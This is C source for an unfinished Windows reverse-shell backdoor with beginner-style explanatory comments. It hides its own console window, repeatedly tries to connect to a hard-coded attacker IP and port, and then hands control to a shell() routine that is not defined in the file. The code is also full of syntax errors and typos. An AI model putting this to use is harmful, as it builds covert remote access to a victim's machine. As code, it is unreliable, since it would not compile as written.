#include <stdio.h> 			//Stdio.h allows us to use input and output functions like forexample printf()
#include <stdlib.h>			//stdlib.h lets us use functions related to memmory allocation, process control and more
#include <unistd.h>			//unistd.h Contains POSIX (Portable Operating System Interface) system calls, including functions related to process management, file I/O, and system configuration.

#ifdef _WIN32 																				//this makes these includes windows specific making it so that i can compile and test this program on Linux right now, in the future this will only be able to be compiled on windows cause its intended to be a windows exe only and needs the includes that i am excluding right now.
#include <Winsock2.h>			//winsock2.h provides functionality for Windows sockets (network communication).
#include <windows.h>                    //windows.h includes various Windows-specific functions and macros
#include <winuser.h>                    //winuser.h Contains functions related to Windows user interface elements
#include <wininet.h>                    //wininet.h functions for internet-related tasks
#include <windowsx.h>                   // windowsx.h adds additional Windows-specific macros
#endif

#include <string.h>			//Provides string manipulation functions like strcpy, strcat, and strlen
#include <sys/stat.h>			//see under
#include <sys/types.h>  		//sys/stat.h and sys/types.h  defines data types and structures used for system calls related to file and directory manipulation

//added new variable outside of WinMain cause i will need to use this variable later in other fucntions
int sock; //socket var


int APIENRTY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
                                        //HINSTANCE hInstance: Represents the handle to the current instance of the application. It’s typically used for resource management and window creation.
                                        //HINSTANCE hPrev: Represents the handle to the previous instance of the application. In modern Windows applications, this parameter is usually ignored.
                                        //LPSTR lpCmdLine: Contains the command-line arguments passed to the program. It’s a string that can be parsed to extract relevant information
                                        //int nCmdShow: Specifies how the window should be shown (e.g., minimized, maximized, or normal).

                                        //In summary, WinMain sets up the application environment, processes command-line arguments, and manages window display
                                        
                                        

	HWND stealth;                   //The HWND stealth is a handle to a window in the Windows operating system. In this context, it refers to the console window that was allocated using AllocConsole(). By obtaining a handle to this console window, the program can manipulate its properties, such as hiding it using ShowWindow(stealth, 0). Essentially, HWND allows the program to interact with windows and control their behavior programmatically
	AllocConsole();                 //Allocates a console using AllocConsole(). This allows the program to display console output even if it’s a GUI application.
	stealth = FindWindowA("ConsoleWindowclass", NULL); //Finds a window with the class name “ConsoleWindowclass” using FindWindowA().
	ShowWindow(stealth, 0);         //Hides the window by calling ShowWindow(stealth, 0) with a parameter of 0 (which corresponds to hiding).
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *servIP;
	WSADATA wsaData;

	ServIP ="10.0.2.15";		//the ip of the machine that will be 
	ServPort = 50005;		//
	
	if (WSAStartup(MAKEWORD(2.0), &wsaData != 0){
	exit(1)


sock = socket{AF_INET,SOCK_STREAM, 0}	//AF_INET tells the program that we are establishing a connection over IPv4. SOCK_STREAM defines that we are going to be using a tcp connection to establish the connection between our server and the target.
memset(&ServAddr, 0, sizeof(ServAddr)); //clears the variable with zeros through getting its location in memory via '&'
ServAddr.sin_family = AF_INET;
ServAddr.sin_addr.s_addr = inet_addr(ServIP);
ServAddr/sin_port = htons(ServPort);

start: 
while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) !=0){
  Sleep(5);
  goto start;
}
shell();

}
